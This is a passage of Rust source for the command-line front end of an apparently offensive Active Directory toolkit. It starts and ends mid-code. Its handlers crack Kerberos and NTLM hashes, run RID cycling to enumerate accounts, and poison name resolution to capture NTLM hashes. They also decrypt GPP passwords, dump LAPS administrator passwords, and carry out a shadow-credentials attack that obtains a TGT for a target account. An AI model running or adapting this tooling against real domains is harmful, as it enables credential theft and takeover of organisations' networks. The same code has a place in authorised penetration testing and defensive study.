            }
            _ => {
                println!(
                    " {} Unknown command: {}. Type 'help' for available commands.",
                    "!".red(),
                    cmd
                );
            }
        }
    }
}

pub async fn cmd_crack(
    _cli: &Cli,
    hash: Option<&str>,
    file: Option<&str>,
    mode: CrackMode,
    wordlist: Option<&str>,
    max_candidates: usize,
    hashcat: bool,
) -> i32 {
    banner::print_module_banner("CRACK");
    println!(" {} Mode: {:?}", ">".bright_black(), mode);

    // Setup CrackerConfig
    let mut config = match mode {
        CrackMode::Fast => overthrone_core::crypto::cracker::CrackerConfig::fast(),
        CrackMode::Thorough => overthrone_core::crypto::cracker::CrackerConfig::thorough(),
        CrackMode::Default => overthrone_core::crypto::cracker::CrackerConfig::default(),
    };

    config.prefer_hashcat = hashcat;

    if let Some(w) = wordlist {
        println!(" {} Wordlist: {}", ">".bright_black(), w.cyan());
        config.custom_wordlist = Some(w.to_string());
        config.use_embedded = false;
    } else {
        println!(
            " {} Wordlist: {}",
            ">".bright_black(),
            "Embedded Top-10K".cyan()
        );
    }

    if max_candidates > 0 {
        config.max_candidates = max_candidates;
    }

    // Initialize HashCracker
    let cracker = match overthrone_core::crypto::cracker::HashCracker::new(config) {
        Ok(c) => c,
        Err(e) => {
            banner::print_fail(&format!("Cracker initialization failed: {}", e));
            return 1;
        }
    };

    // Helper to parse string hashes into HashType
    fn parse_hash(
        h_str: &str,
    ) -> std::result::Result<
        overthrone_core::crypto::cracker::HashType,
        overthrone_core::error::OverthroneError,
    > {
        let trimmed = h_str.trim();
        if trimmed.starts_with("$krb5asrep$") {
            overthrone_core::crypto::cracker::HashType::parse_asrep(trimmed)
        } else if trimmed.starts_with("$krb5tgs$") {
            overthrone_core::crypto::cracker::HashType::parse_kerberoast(trimmed)
        } else {
            overthrone_core::crypto::cracker::HashType::parse_ntlm(trimmed)
        }
    }

    // Process single hash
    if let Some(hash_str) = hash {
        println!(" {} Cracking hash...", ">".bright_black());

        match parse_hash(hash_str) {
            Ok(hash_type) => {
                let result = cracker.crack(&hash_type);
                if result.cracked {
                    println!("\n {} Hash cracked successfully!", "[+]".green());
                    if let Some(u) = result.username {
                        println!(" User: {}", u.cyan());
                    }
                    println!(" Type: {}", result.hash_type.yellow());
                    if let Some(pwd) = result.password {
                        println!(" Plaintext: {}", pwd.green());
                    }
                    println!(
                        " Time: {}ms ({} candidates)",
                        result.time_ms, result.candidates_tried
                    );
                } else {
                    banner::print_warn(
                        "Hash not cracked - try a different wordlist or thorough mode",
                    );
                }
            }
            Err(e) => {
                banner::print_fail(&format!("Invalid hash: {}", e));
                return 1;
            }
        }
    } else if let Some(file_path) = file {
        // Process file of hashes
        println!(
            " {} Loading hashes from: {}",
            ">".bright_black(),
            file_path.cyan()
        );

        match tokio::fs::read_to_string(file_path).await {
            Ok(content) => {
                let mut hashes = Vec::new();
                for (i, line) in content.lines().enumerate() {
                    let trimmed = line.trim();
                    if trimmed.is_empty() || trimmed.starts_with('#') {
                        continue;
                    }
                    match parse_hash(trimmed) {
                        Ok(h) => hashes.push(h),
                        Err(_) => {
                            // Assuming `warn!` macro is available, e.g., from `log` crate
                            // If not, this line would need to be adjusted or `use log::warn;` added.
                            warn!("Skipping invalid hash at line {}: {}", i + 1, trimmed);
                        }
                    }
                }

                if hashes.is_empty() {
                    banner::print_fail("No valid hashes found in file");
                    return 1;
                }

                println!(" {} Loaded {} valid hash(es)", "[+]".green(), hashes.len());
                println!(" {} Starting parallel crack...", ">".bright_black());

                let results = cracker.crack_batch(&hashes);
                let cracked_count = results.iter().filter(|r| r.cracked).count();

                println!("\n {} Results:", ">".bright_black());
                for result in &results {
                    if result.cracked {
                        let user = result.username.as_deref().unwrap_or("unknown");
                        println!(
                            " {} {} ({}) -> {}",
                            "[+]".green(),
                            user.cyan(),
                            result.hash_type.dimmed(),
                            result.password.as_deref().unwrap_or("").yellow()
                        );
                    }
                }

                println!(
                    "\n {} Summary: Cracked {}/{} hashes",
                    if cracked_count > 0 {
                        "[+]".green()
                    } else {
                        "!".yellow()
                    },
                    cracked_count,
                    hashes.len()
                );
            }
            Err(e) => {
                banner::print_fail(&format!("Failed to read file: {}", e));
                return 1;
            }
        }
    } else {
        banner::print_fail("No hash or file specified. Use --hash or --file");
        return 1;
    }

    banner::print_success("Cracking completed");
    0
}

// ----------------------------------------------
// cmd_rid -- RID Cycling
// ----------------------------------------------

pub async fn cmd_rid(cli: &Cli, start_rid: u32, end_rid: u32, null_session: bool) -> i32 {
    banner::print_module_banner("RID CYCLING");
    println!(
        " {} RID range: {} - {}",
        ">".bright_black(),
        start_rid,
        end_rid
    );
    println!(" {} Null session: {}", ">".bright_black(), null_session);

    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    // Resolve credential list -- always try to get creds even in null_session mode.
    // WS2022/2025 blocks null sessions to SAMR, so credentials are required.
    let creds_list = crate::require_creds_list(cli).unwrap_or_default();

    println!(" {} Target DC: {}", ">".bright_black(), dc.cyan());
    if !creds_list.is_empty() {
        println!(
            " {} Credential sets: {}",
            ">".bright_black(),
            creds_list.len().to_string().yellow()
        );
    }
    println!(
        " {} Starting RID enumeration via MS-SAMR...",
        ">".bright_black()
    );

    let mut all_results = Vec::new();

    // Try credentials FIRST (required for WS2022/2025 where null sessions are blocked)
    for (i, creds) in creds_list.iter().enumerate() {
        println!(
            " {} Trying credential set {}/{}: {}\\{}",
            ">".bright_black(),
            i + 1,
            creds_list.len(),
            creds.domain.cyan(),
            creds.username.cyan()
        );

        let config = RidCycleConfig {
            target: dc.clone(),
            domain: creds.domain.clone(),
            username: creds.username.clone(),
            password: creds.password().map(str::to_string).unwrap_or_default(),
            null_session: false,
            start_rid,
            end_rid,
            batch_size: 50,
        };

        match rid_cycle(&config).await {
            Ok(results) => {
                all_results.extend(results);
            }
            Err(e) => {
                warn!(
                    "RID cycling with creds {}/{} failed: {e}",
                    i + 1,
                    creds_list.len()
                );
            }
        }
    }

    // Fall back to null session if no creds worked (may work on WS2019 and earlier)
    if all_results.is_empty() && (null_session || creds_list.is_empty()) {
            println!(
                " {} Trying null session (may fail on WS2022/2025)...",
                ">".bright_black()
            );
            let config = RidCycleConfig {
                target: dc.clone(),
                domain: String::new(),
                username: String::new(),
                password: String::new(),
                null_session: true,
                start_rid,
                end_rid,
                batch_size: 50,
            };
            match rid_cycle(&config).await {
                Ok(results) => {
                    all_results.extend(results);
                }
                Err(e) => {
                    warn!("Null session RID cycling failed: {e}");
                    if creds_list.is_empty() {
                        banner::print_fail(
                            "RID cycling failed. On WS2022/2025, null sessions are blocked. \
                             Provide credentials with -u/-p flags."
                        );
                        return 1;
                    }
                }
            }
    }

    if all_results.is_empty() {
        banner::print_fail("RID cycling returned no results");
        return 1;
    }

    let results = all_results;
    let users = results
        .iter()
        .filter(|r| r.account_type == RidAccountType::User)
        .count();
    let groups = results
        .iter()
        .filter(|r| r.account_type == RidAccountType::Group)
        .count();
    let aliases = results
        .iter()
        .filter(|r| r.account_type == RidAccountType::Alias)
        .count();

    if wants_json(cli) {
        let accounts: Vec<serde_json::Value> = results
            .iter()
            .map(|r| {
                serde_json::json!({
                "rid": r.rid,
                "name": r.name,
                "account_type": format!("{:?}", r.account_type),
                })
            })
            .collect();
        return emit_json(
            cli,
            serde_json::json!({
            "status": "success",
            "target": dc,
            "total": results.len(),
            "users": users,
            "groups": groups,
            "aliases": aliases,
            "accounts": accounts,
            }),
        );
    }

    println!("\n{}", "RID Cycling Results:".yellow().bold());
    println!(
        "{}",
        "-------------------------------------------------".dimmed()
    );
    println!(
        " {} Total: {} | Users: {} | Groups: {} | Aliases: {}",
        "[*]".cyan(),
        results.len().to_string().green().bold(),
        users.to_string().green(),
        groups.to_string().yellow(),
        aliases.to_string().yellow()
    );
    println!();

    // Print users
    let user_results: Vec<_> = results
        .iter()
        .filter(|r| r.account_type == RidAccountType::User)
        .collect();
    if !user_results.is_empty() {
        println!(" {} Users:", "#".green());
        for r in &user_results {
            println!(
                " {} RID {:>5}: {}",
                ">".bright_black(),
                r.rid,
                r.name.cyan()
            );
        }
        println!();
    }

    // Print groups
    let group_results: Vec<_> = results
        .iter()
        .filter(|r| r.account_type == RidAccountType::Group)
        .collect();
    if !group_results.is_empty() {
        println!(" {} Groups:", "#".yellow());
        for r in &group_results {
            println!(
                " {} RID {:>5}: {}",
                ">".bright_black(),
                r.rid,
                r.name.cyan()
            );
        }
        println!();
    }

    // Print aliases
    let alias_results: Vec<_> = results
        .iter()
        .filter(|r| r.account_type == RidAccountType::Alias)
        .collect();
    if !alias_results.is_empty() {
        println!(" {} Aliases:", "#".yellow());
        for r in &alias_results {
            println!(
                " {} RID {:>5}: {}",
                ">".bright_black(),
                r.rid,
                r.name.cyan()
            );
        }
    }

    banner::print_success(&format!(
        "RID cycling complete -- {} accounts discovered",
        results.len()
    ));
    0
}
// ----------------------------------------------
// cmd_move -- Lateral Movement
// ----------------------------------------------

/// Display captured NTLM credentials from the responder.
#[cfg(feature = "responder")]
fn print_captured_creds(creds: &[overthrone_crawler::CapturedCredential]) {
    if creds.is_empty() {
        return;
    }
    for cred in creds {
        println!(
            " {} {}@{} (via {})",
            "[*]".red(),
            cred.username.bright_white(),
            cred.domain.bright_cyan(),
            cred.protocol.bright_black()
        );
        println!(
            " {} {}",
            "hashcat:".dimmed(),
            cred.to_hashcat_format().bright_green()
        );
    }
}

/// Run the crawler with optional responder/poisoner in the background.
/// Only available when the `responder` feature is enabled.
#[cfg(all(feature = "crawler", feature = "responder"))]
async fn run_crawl(
    config: &overthrone_crawler::CrawlerConfig,
    reaper: &overthrone_reaper::ReaperResult,
    rcfg: Option<&overthrone_crawler::CrawlerResponderConfig>,
) -> anyhow::Result<overthrone_crawler::CrawlerResult> {
    if let Some(cfg) = rcfg {
        let (result, creds, _queries) =
            overthrone_crawler::run_crawler_with_services(config, reaper, Some(cfg)).await?;
        print_captured_creds(&creds);
        Ok(result)
    } else {
        overthrone_crawler::run_crawler(config, reaper)
            .await
            .map_err(Into::into)
    }
}

/// Fallback -- responder is not available, just run the plain crawler.
#[cfg(all(feature = "crawler", not(feature = "responder")))]
async fn run_crawl(
    config: &overthrone_crawler::CrawlerConfig,
    reaper: &overthrone_reaper::ReaperResult,
) -> anyhow::Result<overthrone_crawler::CrawlerResult> {
    overthrone_crawler::run_crawler(config, reaper)
        .await
        .map_err(Into::into)
}

#[cfg(feature = "reaper")]
pub async fn cmd_move(
    cli: &Cli,
    action: &MoveAction,
    poison_ip: Option<&str>,
    respond: bool,
) -> i32 {
    banner::print_module_banner("MOVE");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    // Build crawler config for trust analysis
    let crawler_config = CrawlerConfig {
        dc_ip: dc.clone(),
        domain: creds.domain.clone(),
        base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        trusted_dc_ips: vec![],
        modules: vec![],
        max_depth: 5,
        auto_pivot: false,
    };

    // Build responder config from CLI flags (if feature enabled)
    #[cfg(feature = "responder")]
    let responder_config: Option<overthrone_crawler::CrawlerResponderConfig> = {
        if poison_ip.is_some() || respond {
            Some(overthrone_crawler::CrawlerResponderConfig::from_cli(
                poison_ip.map(|s| s.to_string()),
                respond,
            ))
        } else {
            None
        }
    };

    match action {
        MoveAction::Trusts => {
            println!(" {} Enumerating domain trusts...", ">".bright_black());
            // Run reaper first to get trust data
            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec!["trusts".to_string()],
                page_size: 500,
                use_ldaps: false,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => {
                    let trust_count = reaper_result.trusts.len();
                    println!(" {} Found {} trust(s)", "[+]".green(), trust_count);

                    for trust in &reaper_result.trusts {
                        println!(
                            " {} -> {} (Type: {}, Direction: {})",
                            creds.domain.cyan(),
                            trust.target_domain.cyan(),
                            trust.trust_type.to_string().yellow(),
                            trust.direction.to_string().dimmed()
                        );
                        println!(
                            " SID Filtering: {} Transitive: {}",
                            if trust.sid_filtering_enabled {
                                "Enabled".green()
                            } else {
                                "DISABLED".red()
                            },
                            if trust.transitive {
                                "Yes".green()
                            } else {
                                "No".yellow()
                            }
                        );
                    }

                    banner::print_success(&format!(
                        "Trust enumeration completed - {} trusts",
                        trust_count
                    ));
                }
                Err(e) => {
                    banner::print_fail(&format!("Trust enumeration failed: {}", e));
                    return 1;
                }
            }
        }
        MoveAction::Escalation => {
            println!(
                " {} Finding cross-domain escalation paths...",
                ">".bright_black()
            );

            // Run reaper for data, then crawler for analysis
            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec![
                    "trusts".to_string(),
                    "groups".to_string(),
                    "users".to_string(),
                ],
                page_size: 500,
                use_ldaps: false,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => {
                    let crawl_result = {
                        #[cfg(feature = "responder")]
                        {
                            run_crawl(&crawler_config, &reaper_result, responder_config.as_ref())
                                .await
                        }
                        #[cfg(not(feature = "responder"))]
                        {
                            run_crawl(&crawler_config, &reaper_result).await
                        }
                    };
                    match crawl_result {
                        Ok(crawler_result) => {
                            let path_count = crawler_result.escalation_paths.len();
                            println!(" {} Found {} escalation path(s)", "[+]".green(), path_count);

                            for (i, path) in crawler_result.escalation_paths.iter().enumerate() {
                                println!(
                                    " Path {}: {} -> {}",
                                    i + 1,
                                    path.source_domain.cyan(),
                                    path.target_domain.yellow()
                                );
                                println!(
                                    " Difficulty: {} Hops: {}",
                                    path.difficulty().yellow(),
                                    path.total_hops
                                );
                                println!(" {}", path.description.dimmed());
                            }

                            // Also show foreign memberships
                            if !crawler_result.foreign_memberships.is_empty() {
                                println!("\n {} Foreign group memberships:", ">".bright_black());
                                for fm in &crawler_result.foreign_memberships {
                                    println!(
                                        " {}\\{} -> {} ({})",
                                        fm.foreign_domain.cyan(),
                                        fm.foreign_principal.yellow(),
                                        fm.local_group.dimmed(),
                                        if fm.is_privileged_group {
                                            "PRIVILEGED".red()
                                        } else {
                                            "normal".dimmed()
                                        }
                                    );
                                }
                            }

                            banner::print_success(&format!(
                                "Escalation analysis completed - {} paths",
                                path_count
                            ));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Crawler analysis failed: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Data collection failed: {}", e));
                    return 1;
                }
            }
        }
        MoveAction::Mssql => {
            println!(" {} Analyzing MSSQL linked servers...", ">".bright_black());

            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec!["mssql".to_string()],
                page_size: 500,
                use_ldaps: false,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => {
                    let crawl_result = {
                        #[cfg(feature = "responder")]
                        {
                            run_crawl(&crawler_config, &reaper_result, responder_config.as_ref())
                                .await
                        }
                        #[cfg(not(feature = "responder"))]
                        {
                            run_crawl(&crawler_config, &reaper_result).await
                        }
                    };
                    match crawl_result {
                        Ok(crawler_result) => {
                            let chain_count = crawler_result.mssql_chains.len();
                            println!(
                                " {} Found {} MSSQL link chain(s)",
                                "[+]".green(),
                                chain_count
                            );

                            for chain in &crawler_result.mssql_chains {
                                let chain_str: Vec<String> = chain
                                    .links
                                    .iter()
                                    .map(|l| format!("{} -> {}", l.source_server, l.target_server))
                                    .collect();
                                println!(" Chain: {}", chain_str.join(" | ").cyan());
                                println!(
                                    " Depth: {} Cross-domain: {} Risk: {}",
                                    chain.depth,
                                    if chain.crosses_domain {
                                        "Yes".red()
                                    } else {
                                        "No".green()
                                    },
                                    chain.risk_level.yellow()
                                );
                                println!(" {}", chain.description.dimmed());
                            }

                            banner::print_success(&format!(
                                "MSSQL analysis completed - {} chains",
                                chain_count
                            ));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("MSSQL analysis failed: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Data collection failed: {}", e));
                    return 1;
                }
            }
        }
        MoveAction::Map => {
            println!(" {} Generating trust map...", ">".bright_black());

            let reaper_config = ReaperConfig {
                dc_ip: dc.clone(),
                domain: creds.domain.clone(),
                base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
                username: creds.username.clone(),
                password: creds.password().map(str::to_string),
                nt_hash: creds.nthash().map(str::to_string),
                modules: vec!["trusts".to_string()],
                page_size: 500,
                use_ldaps: false,
            };

            match overthrone_reaper::runner::run_reaper(&reaper_config).await {
                Ok(reaper_result) => {
                    let crawl_result = {
                        #[cfg(feature = "responder")]
                        {
                            run_crawl(&crawler_config, &reaper_result, responder_config.as_ref())
                                .await
                        }
                        #[cfg(not(feature = "responder"))]
                        {
                            run_crawl(&crawler_config, &reaper_result).await
                        }
                    };
                    match crawl_result {
                        Ok(crawler_result) => {
                            println!(" {} Trust map generated", "[+]".green());

                            // Print ASCII art trust map
                            let graph = &crawler_result.trust_map;
                            println!(
                                "\n [{}]",
                                graph
                                    .domains
                                    .first()
                                    .map(|d| d.name.as_str())
                                    .unwrap_or("DOMAIN")
                                    .to_uppercase()
                                    .bright_cyan()
                            );

                            if graph.trusts.is_empty() {
                                println!(" (no trusts found)");
                            } else {
                                for trust in &graph.trusts {
                                    println!(" |");
                                    println!(" [{}]", trust.target_domain.to_uppercase().cyan());
                                }
                            }

                            // Show SID filter findings
                            if !crawler_result.sid_filter_findings.is_empty() {
                                println!("\n {} SID Filter Issues:", "!".red());
                                for finding in &crawler_result.sid_filter_findings {
                                    println!(
                                        " {} -> {} ({}) - {}",
                                        finding.source_domain.red(),
                                        finding.target_domain.yellow(),
                                        finding.trust_type.dimmed(),
                                        finding.risk_level
                                    );
                                }
                            }

                            // Show PAM findings
                            if !crawler_result.pam_findings.is_empty() {
                                println!("\n {} PAM Trust Issues:", "!".red());
                                for finding in &crawler_result.pam_findings {
                                    let finding_type_str = match finding.finding_type {
 overthrone_crawler::pam::PamFindingType::PamTrustDetected => "PAM Trust Detected",
 overthrone_crawler::pam::PamFindingType::PamTrustNoFiltering => "PAM Trust No Filtering",
 overthrone_crawler::pam::PamFindingType::TrustEscalationRisk => "Trust Escalation Risk",
 overthrone_crawler::pam::PamFindingType::NoPamTrustsFound => "No PAM Trusts",
 };
                                    println!(
                                        " {} -> {} ({}) - {}",
                                        finding.bastion_domain.red(),
                                        finding.production_domain.yellow(),
                                        finding.risk_level,
                                        finding_type_str.dimmed()
                                    );
                                }
                            }

                            banner::print_success(&format!(
                                "Trust map completed - {} domains",
                                graph.domains.len()
                            ));
                        }
                        Err(e) => {
                            banner::print_fail(&format!("Trust map generation failed: {}", e));
                            return 1;
                        }
                    }
                }
                Err(e) => {
                    banner::print_fail(&format!("Data collection failed: {}", e));
                    return 1;
                }
            }
        }
    }

    0
}

// ----------------------------------------------
// cmd_gpp -- GPP Password Decryption
// ----------------------------------------------

pub async fn cmd_gpp(cli: &Cli, file: Option<&str>, cpassword: Option<&str>) -> i32 {
    banner::print_module_banner("GPP");

    if let Some(cpass) = cpassword {
        println!(
            " {} Decrypting cpassword: {}",
            ">".bright_black(),
            cpass.cyan()
        );

        // Use the real GPP decryption from core
        match decrypt_gpp_password(cpass) {
            Ok(password) => {
                if wants_json(cli) {
                    return emit_json(
                        cli,
                        serde_json::json!({
                        "status": "success",
                        "mode": "cpassword",
                        "credentials": [{"cpassword": cpass, "password": password}],
                        }),
                    );
                }
                println!(
                    " {} Decrypted password: {}",
                    "[+]".green(),
                    password.yellow()
                );
                banner::print_success("GPP decryption completed");
                0
            }
            Err(e) => {
                if wants_json(cli) {
                    return emit_json(
                        cli,
                        serde_json::json!({
                        "status": "error",
                        "mode": "cpassword",
                        "error": e.to_string(),
                        }),
                    );
                }
                banner::print_fail(&format!("Decryption failed: {}", e));
                1
            }
        }
    } else if let Some(file_path) = file {
        println!(
            " {} Parsing GPP file: {}",
            ">".bright_black(),
            file_path.cyan()
        );

        // Read the file and parse for credentials
        match tokio::fs::read_to_string(file_path).await {
            Ok(content) => {
                let creds = parse_gpp_xml(&content, file_path);

                if creds.is_empty() {
                    if wants_json(cli) {
                        return emit_json(
                            cli,
                            serde_json::json!({
                            "status": "success",
                            "mode": "file",
                            "file": file_path,
                            "credentials": [],
                            }),
                        );
                    }
                    println!(" {} No credentials found in file", "!".yellow());
                    banner::print_warn("No cpassword entries found");
                    return 0;
                }

                if wants_json(cli) {
                    let creds_json: Vec<serde_json::Value> = creds
                        .iter()
                        .map(|c| {
                            serde_json::json!({
                            "username": c.username,
                            "password": c.password,
                            "changed": c.changed,
                            })
                        })
                        .collect();
                    return emit_json(
                        cli,
                        serde_json::json!({
                        "status": "success",
                        "mode": "file",
                        "file": file_path,
                        "credentials": creds_json,
                        }),
                    );
                }

                println!(" {} Found {} credential(s)", "[+]".green(), creds.len());
                for cred in &creds {
                    println!(" {}: {}", cred.username.cyan(), cred.password.yellow());
                    if !cred.changed.is_empty() {
                        println!(" Changed: {}", cred.changed.dimmed());
                    }
                }

                banner::print_success(&format!(
                    "GPP decryption completed - {} credentials",
                    creds.len()
                ));
                0
            }
            Err(e) => {
                if wants_json(cli) {
                    return emit_json(
                        cli,
                        serde_json::json!({
                        "status": "error",
                        "mode": "file",
                        "file": file_path,
                        "error": e.to_string(),
                        }),
                    );
                }
                banner::print_fail(&format!("Failed to read file: {}", e));
                1
            }
        }
    } else {
        if wants_json(cli) {
            return emit_json(
                cli,
                serde_json::json!({
                "status": "error",
                "error": "No cpassword or file specified. Use --cpassword or --file",
                }),
            );
        }
        banner::print_fail("No cpassword or file specified. Use --cpassword or --file");
        1
    }
}

// ----------------------------------------------
// cmd_laps -- LAPS Password Reading
// ----------------------------------------------

#[cfg(feature = "reaper")]
pub async fn cmd_laps(cli: &Cli, computer: Option<&str>) -> i32 {
    banner::print_module_banner("LAPS");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };

    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    // Build ReaperConfig for LAPS enumeration
    let config = ReaperConfig {
        dc_ip: dc.clone(),
        domain: creds.domain.clone(),
        base_dn: ReaperConfig::base_dn_from_domain(&creds.domain),
        username: creds.username.clone(),
        password: creds.password().map(str::to_string),
        nt_hash: creds.nthash().map(str::to_string),
        modules: vec!["laps".to_string()],
        page_size: 500,
        use_ldaps: false,
    };

    if let Some(comp) = computer {
        println!(
            " {} Querying LAPS password for: {}",
            ">".bright_black(),
            comp.cyan()
        );
    } else {
        println!(
            " {} Enumerating all LAPS passwords via LDAP...",
            ">".bright_black()
        );
    }

    // Execute LAPS enumeration using the reaper module
    match enumerate_laps(&config).await {
        Ok(entries) => {
            let total = entries.len();

            if wants_json(cli) {
                let entries_json: Vec<serde_json::Value> = entries
                    .iter()
                    .map(|e| {
                        serde_json::json!({
                        "computer_name": e.computer_name,
                        "password": e.password,
                        "laps_version": if e.is_laps_v2 { "v2" } else { "v1" },
                        })
                    })
                    .collect();
                return emit_json(
                    cli,
                    serde_json::json!({
                    "status": "success",
                    "dc": dc,
                    "total": total,
                    "readable": entries.iter().filter(|e| e.password.is_some()).count(),
                    "entries": entries_json,
                    }),
                );
            }

            let readable: Vec<_> = entries.iter().filter(|e| e.password.is_some()).collect();

            if let Some(filter_comp) = computer {
                // Filter to specific computer
                let filtered: Vec<_> = entries
                    .iter()
                    .filter(|e| {
                        e.computer_name
                            .to_lowercase()
                            .contains(&filter_comp.to_lowercase())
                    })
                    .collect();

                if filtered.is_empty() {
                    println!(
                        " {} Computer '{}' not found or no LAPS access",
                        "!".yellow(),
                        filter_comp
                    );
                    return 0;
                }

                for entry in &filtered {
                    println!(
                        " {} {} ({})",
                        "[+]".green(),
                        entry.computer_name.cyan(),
                        if entry.is_laps_v2 {
                            "LAPSv2".dimmed()
                        } else {
                            "LAPSv1".dimmed()
                        }
                    );
                    if let Some(ref pwd) = entry.password {
                        println!(" Password: {}", pwd.yellow());
                    } else {
                        println!(" Password: {}", "Not readable".red());
                    }
                }
            } else if entries.is_empty() {
                println!(" {} No LAPS-enabled computers found", "!".yellow());
            } else {
                println!(
                    " {} Found {} LAPS-enabled computers ({} readable)",
                    "[+]".green(),
                    total,
                    readable.len()
                );

                for entry in &entries {
                    let status = if entry.password.is_some() {
                        "[+]".green()
                    } else {
                        "[-]".red()
                    };
                    println!(
                        " {} {} ({})",
                        status,
                        entry.computer_name.cyan(),
                        if entry.is_laps_v2 {
                            "v2".dimmed()
                        } else {
                            "v1".dimmed()
                        }
                    );

                    if let Some(ref pwd) = entry.password {
                        println!(" Password: {}", pwd.yellow());
                    }
                }
            }

            banner::print_success(&format!("LAPS enumeration completed - {} computers", total));
            0
        }
        Err(e) => {
            if wants_json(cli) {
                return emit_json(
                    cli,
                    serde_json::json!({
                    "status": "error",
                    "dc": dc,
                    "error": e.to_string(),
                    }),
                );
            }
            banner::print_fail(&format!("LAPS enumeration failed: {}", e));
            1
        }
    }
}

// ----------------------------------------------
// cmd_shadow_cred -- Shadow Credential Lifecycle
// ----------------------------------------------

#[cfg(feature = "reaper")]
pub async fn cmd_shadow_cred(cli: &Cli, action: &ShadowCredAction) -> i32 {
    banner::print_module_banner("SHADOW CREDENTIALS");

    let creds = match crate::require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match crate::require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let domain = match cli.domain.as_deref() {
        Some(d) => d.to_string(),
        None => {
            banner::print_fail("--domain is required");
            return 1;
        }
    };

    let mut ldap = if let Some(hash) = creds.nthash() {
        match overthrone_core::proto::ldap::LdapSession::connect_with_hash(
            &dc,
            &domain,
            &creds.username,
            hash,
            false,
        )
        .await
        {
            Ok(s) => s,
            Err(e) => {
                banner::print_fail(&format!("LDAP connect failed: {e}"));
                return 1;
            }
        }
    } else {
        match overthrone_core::proto::ldap::LdapSession::connect(
            &dc,
            &domain,
            &creds.username,
            creds.password().unwrap_or(""),
            false,
        )
        .await
        {
            Ok(s) => s,
            Err(e) => {
                banner::print_fail(&format!("LDAP connect failed: {e}"));
                return 1;
            }
        }
    };

    match action {
        ShadowCredAction::Add {
            target,
            key_size,
            validity_hours,
        } => {
            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
                Ok(dn) => dn,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            println!(
                " {} Target: {} ({})",
                ">".bright_black(),
                target.cyan(),
                target_dn.dimmed()
            );
            println!(" {} Key size: {} bits", ">".bright_black(), key_size);
            println!(" {} Validity: {} hours", ">".bright_black(), validity_hours);

            match overthrone_core::postex::cves::try_exploit_shadow_credentials(
                &mut ldap, &dc, &domain, &target_dn, target,
            )
            .await
            {
                Ok(result) => {
                    banner::print_success("Shadow credential added and PKINIT auth succeeded");
                    println!(
                        " {} Certificate: {} bytes",
                        ">".bright_black(),
                        result.certificate.len()
                    );
                    println!(
                        " {} Private key: {} bytes",
                        ">".bright_black(),
                        result.private_key.len()
                    );
                    println!(" {} TGT: {} bytes", ">".bright_black(), result.tgt.len());
                    println!(
                        " {} Run ovt shadow-cred remove {} --key-id <ID> or ovt shadow-cred clear {} to clean up",
                        "!".yellow(),
                        target.cyan(),
                        target.cyan(),
                    );
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!(
                        "Shadow credential attack on {target} failed: {e}"
                    ));
                    1
                }
            }
        }

        ShadowCredAction::List { target } => {
            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
                Ok(dn) => dn,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            println!(
                " {} Reading msDS-KeyCredentialLink on: {}",
                ">".bright_black(),
                target_dn.cyan()
            );

            match ldap
                .read_attribute(&target_dn, "msDS-KeyCredentialLink")
                .await
            {
                Ok(values) => {
                    if values.is_empty() {
                        println!(
                            " {} No shadow credentials found on {}",
                            "!".yellow(),
                            target.cyan()
                        );
                        return 0;
                    }
                    let creds =
                        overthrone_forge::shadow_credentials::parse_key_credentials(&values);
                    println!(
                        " {} Found {} key credential(s):",
                        "[+]".green(),
                        creds.len()
                    );
                    for (i, cred) in creds.iter().enumerate() {
                        println!(
                            " {}. KeyId: {} Created: {}",
                            i + 1,
                            cred.key_id.yellow(),
                            cred.created
                                .format("%Y-%m-%d %H:%M:%S UTC")
                                .to_string()
                                .dimmed()
                        );
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Failed to read KeyCredentialLink: {e}"));
                    1
                }
            }
        }

        ShadowCredAction::Remove { target, key_id } => {
            let target_dn = match resolve_shadow_target_dn(&mut ldap, target, &domain).await {
                Ok(dn) => dn,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            println!(" {} Target: {}", ">".bright_black(), target_dn.cyan());
            println!(
                " {} KeyId to remove: {}",
                ">".bright_black(),
                key_id.yellow()
            );

            let values = match ldap
